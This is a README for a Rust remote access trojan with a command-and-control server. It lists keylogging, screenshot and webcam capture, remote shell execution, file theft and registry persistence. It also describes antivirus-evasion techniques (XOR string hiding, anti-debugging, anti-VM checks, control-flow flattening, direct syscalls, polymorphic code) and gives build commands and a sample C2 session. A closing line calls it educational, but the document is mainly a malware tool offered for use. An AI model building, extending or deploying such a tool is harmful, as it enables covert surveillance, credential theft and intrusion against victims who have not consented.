# Remote Access Trojan (RAT)

An advanced RAT implementation in Rust with C2 server and client, featuring encrypted communication and advanced anti-AV techniques.

## Features

- **Encrypted Communication**: Uses AES-GCM for secure data transmission between server and clients.
- **Multi-Client Support**: Server can handle multiple simultaneous client connections.
- **Commands Supported**:
  - Shell command execution
  - File download from client
  - File upload to client
  - Screenshot capture
  - Webcam capture
  - Webcam streaming (real-time at 5 fps)
  - Keylogging
  - Client disconnection
- **Anti-AV Techniques**:
  - String encryption using XOR to hide hardcoded strings
  - Anti-debugging checks to detect and evade debuggers
  - Anti-VM checks to detect virtual machine environments
  - Control flow flattening to obfuscate code execution
  - Direct syscall support (Windows API integration)
  - Runtime string decryption to avoid static analysis

## Building

Ensure you have Rust installed. Then build the binaries:

```bash
cargo build --bin server
cargo build --bin client
```

## Running

### Server
Run the C2 server:
```bash
./target/debug/server
```
The server listens on `0.0.0.0:7878` and provides an interactive shell for managing connected clients.

### Client
Run the client:
```bash
./target/debug/client
```
The client attempts to connect to `127.0.0.1:7878` and waits for commands from the server.

## Usage

Once the server is running, use the interactive shell to manage clients:

- `list` - List all connected clients
- `shell <id> <command>` - Execute a shell command on the specified client (e.g., `shell 0 whoami`)
- `download <id> <filename>` - Download a file from the client's filesystem
- `keylog <id>` - Retrieve keylog data from the client
- `screenshot <id>` - Capture screenshot from client (saved as client_<id>_screenshot.png)
- `webcam <id>` - Capture webcam image from client (saved as client_<id>_webcam.png)
- `webcam_stream <id>` - Record webcam video for ~2 seconds (saved as client_<id>_webcam_video.mp4)
- `exit <id>` - Disconnect the specified client
- `help` - Display available commands

Example session:
```
C2> list
Connected clients:
  Client 0
C2> shell 0 dir
Sent shell command to client 0
C2> keylog 0
Requested keylog from client 0
C2> screenshot 0
Requested screenshot from client 0
C2> webcam_stream 0
Started webcam stream from client 0
```

## Anti-AV Enhancements

To further evade antivirus detection:

- **String Encryption**: Implement XOR encryption for hardcoded strings. Use the `decrypt_string` function (currently removed but can be re-added) with encrypted byte arrays.
- **Direct Syscalls**: Replace `std::process::Command` with direct Windows API calls using the `windows` crate (e.g., `CreateProcessA`).
- **Obfuscation**: Use external tools like `cargo-obfuscator` for binary obfuscation.
- **Polymorphic Code**: Implement runtime code mutation for added evasion.

## Dependencies

- `tokio` - Asynchronous runtime
- `aes-gcm` - Encryption
- `serde` - Serialization
- `rdev` - Keylogging
- `winreg` - Registry persistence
- `scrap` - Screenshot capture
- `nokhwa` - Webcam capture
- `windows` - Direct Windows API access

## Disclaimer

This project is for educational purposes only. Unauthorized use of remote access tools is illegal and unethical. Use responsibly and only on systems you own or have explicit permission to access.
